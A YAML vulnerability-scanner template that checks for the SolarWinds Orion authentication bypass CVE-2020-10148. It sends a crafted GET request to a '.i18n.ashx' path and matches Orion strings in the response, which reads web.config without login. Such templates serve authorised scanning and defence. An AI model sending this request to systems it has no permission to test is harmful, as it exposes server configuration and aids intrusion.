id: solarwinds-cve-2020-10148

info:
    name: solarwinds-cve-2020-10148
    author: su(https://suzzz112113.github.io/#blog)
    severity: critical

manual: true
transport: http
set:
    r1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /web.config.i18n.ashx?l=en-US&v={{r1}}
        expression: response.status == 200 && response.body.bcontains(bytes("SolarWinds.Orion.Core.Common")) && response.body.bcontains(bytes("/Orion/NetPerfMon/TemplateSiblingIconUrl"))
expression: r0()
